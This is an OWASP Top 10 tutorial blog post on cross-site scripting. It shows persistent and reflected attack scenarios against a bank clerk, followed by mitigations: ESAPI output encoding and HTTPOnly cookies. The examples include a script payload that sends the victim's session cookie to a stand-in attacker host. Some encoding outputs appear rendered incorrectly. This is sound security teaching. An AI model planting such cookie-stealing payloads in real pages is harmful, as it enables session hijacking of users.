---
authors:
- Philippe Cery
categories:
- OWASP
- Sécurité
- Web
date: 2013-10-28T08:57:07.000Z
title: "OWASP Top 10 - A3 Cross Site Scripting (XSS)"
image: 
---

## Description

Cross-Site Scripting is a specific consequence of an injection attack. The goal is to make a web browser execute arbitrary scripting code (Javascript, ActionScript, ActiveX…) usually to steal personal information.

## Examples

### Persistent XSS attack

The attacker’s bank website proposes a messaging service to communicate with the clerk.
 The attacker posts the following message:
```language-html
Happy New Year!
 <script>x=new Image(); x.src=’http://hack.com/ilovecookies.jsp?yummy=’+document.cookie</script>
```

Once connected on the bank’s website with its special account, the bank clerk consults its new messages. When he opens the suspicious message, he will see the “Happy New Year!” greetings. The second line of the message will not be shown but interpreted by his browser which will silently send his session ID to *hack.com*. Then the attacker will be able to hijack the clerk’s session on the bank’s website to have access to sensitive information on other clients…

### Non-persistent XSS attack

The attacker sends to the clerk an email asking him to consult its account with the following direct link to the website:
```language-html
https://www.mybank.com/details?iban=<script>x=new Image(); x.src=’http://hack.com/ilovecookies.jsp?yummy=’+document.cookie</script>
```

Once authenticated with its own account, the clerk tries to display the account page using the provided link but obviously the bank could not find the requested IBAN and displays an error page to the clerk:
```language-html
IBAN not found: <script>x=new Image(); x.src=’http://hack.com/ilovecookies.jsp?yummy=’+document.cookie</script>
```

Of course, the clerk can only see the beginning of the message “`IBAN not found: `“. The javascript snippet is interpreted by the clerk’s browser and silently send the clerk’s session ID to *hack.com*.

## Mitigations

### Protection against injection attack

If your web application is not protected against [injection](http://blog.ippon.fr/2013/10/11/owasp-top-10-a1/ "OWASP Top 10 - A1 Injection") attacks, it is definitely vulnerable to XSS attacks. When possible, validate untrusted input before usage and storage.

### Output encoding

Sometimes, it is difficult to have an exhaustive white-list of allowed characters when the input is a free text. In theses cases, it is important to canonicalize the input data before storage then encode output data so that special characters are not misinterpreted by the browser. If you don’t canonicalize the input data before storage, encoded input data will be re-encoded.
 E.g. < and > must be converted into `<` and `>` in HTML pages or the string between these 2 characters could be interpreted by the browser as an HTML tag. In the examples above, after encoding, `<script>` becomes `<script>` and won’t be interpreted as a script tag by the browser but displayed as text. Thus the suspicious javascript code won’t be executed.
 Of course, untrusted code can be inserted anywhere in the web page. [ESAPI](https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API "ESAPI")‘s Encoder can be used to encode characters depending on where you need to insert untrusted code. Below are some examples:

```language-java
Encoder encoder = ESAPI.encoder();
String rawOutput = "<script>alert("hello");</script>";
System.out.println("Encoded for HTML : "+encoder.encodeForHTML(rawOutput));
System.out.println("Encoded for CSS : "+encoder.encodeForCSS(rawOutput));
System.out.println("Encoded for Javascript : "+encoder.encodeForJavaScript(rawOutput));
System.out.println("Encoded for URL : "+encoder.encodeForURL(rawOutput));
```

Console output:

```language-html
<em>Encoded for HTML : <script>alert("hello");</script>
Encoded for CSS : 3c script3e alert28 22 hello22 29 3b 3c 2f script3e
Encoded for Javascript : x3Cscriptx3Ealertx28x22hellox22x29x3Bx3Cx2Fscriptx3E
Encoded for URL : %3Cscript%3Ealert%28%22hello%22%29%3B%3C%2Fscript%3E</em>
```

Other open-source third-parties exist to encode text before output. Have a look on [Apache Commons-Lang3 API](http://commons.apache.org/proper/commons-lang/javadocs/api-3.1/org/apache/commons/lang3/StringEscapeUtils.html "Apache Commons-Lang3"). It is less strict on encoding but it is acceptable for a simple web application.

`System.out.println("Encoded for HTML : "+StringEscapeUtils.escapeHtml4(rawOutput));`

Console output:

`<em>Encoded for HTML : <script>alert("hello");</script></em>`

### HTTPOnly cookie flag

The examples above show teo different ways to steal a session ID. As discussed in the previous article, if an attacker steals the session ID of an user authenticated on a website, he can impersonate the victim on that website.

Although only the web browser needs to know the session ID, anyone (including a script) could read the value. That’s why Microsoft IE6 developers decided to implement the HTTPOnly flag. When this flag is set (and if the browser supports it), the XSS attack above won’t be able to steal the session ID.

If your application is Servlet 3.0 compliant, you can configure it by adding the following in your `web.xml`:
```language-xml
<session-config>
  <cookie-config>
    <http-only>true</http-only>
  </cookie-config>
</session-config>
```

Otherwise, you will need to configure your server. For example, if you use Apache Tomcat 6, you can set the HTTPOnly flag on cookies by adding the attribute `useHttpOnly="true"` in your `context.xml`:
```language-xml
<Context ... <em>useHttpOnly="true"</em>>
</Context>```

To see all articles related to OWASP Top 10, follow the tag [#owasp](http://blog.ippon.fr/tag/owasp/ "OWASP Top 10")
